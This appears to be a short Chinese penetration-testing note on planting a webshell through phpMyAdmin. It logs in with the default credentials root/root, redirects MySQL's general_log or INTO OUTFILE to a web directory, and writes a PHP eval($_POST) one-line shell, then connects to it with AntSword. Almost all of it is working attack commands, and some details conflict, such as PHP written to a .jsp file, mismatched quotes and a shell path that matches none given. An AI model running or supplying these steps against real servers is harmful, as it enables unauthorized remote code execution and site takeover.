---
title:  phpmyadmin
---

# SQL日志包含

## 1、在后台登陆管理员，运行sql查询，输入

> 弱密码 root root

![image-20220103212142075](https://tobyjpghub-1258737888.cos.ap-shanghai.myqcloud.com/202201032121150.png)

```
show VARIABLES;
Set global general_log='on';#开启日志

Set global general_log_file='绝对路径';#插入php文件。
/var/lib/mysql/

show variables like '%general%'#查看系统变量值

Select'<?php eval($_POST['cmd']);?>’;#插入一句话木马

Set global general_log_file='绝对路径';#文件路径
```

```
Set global general_log='on';
Set global general_log_file='/var/www/html/succezbi/meta/v_21/CommonData/public/scripts/1.jsp';
show variables like 'general_log_file';




Select "<?php eval($_POST['pass']);?>";




select '<?php @eval($_POST(cmd))?>;'  into outfile '/var/www/html/succezbi/meta/v_21/CommonData/public/scripts/1.jsp'
```





![image-20220103212919607](https://tobyjpghub-1258737888.cos.ap-shanghai.myqcloud.com/202201032129697.png) 

## 2、利用蚁剑连接shell，输入网址/777.php，输入密码cmd，获取网站权限。

 

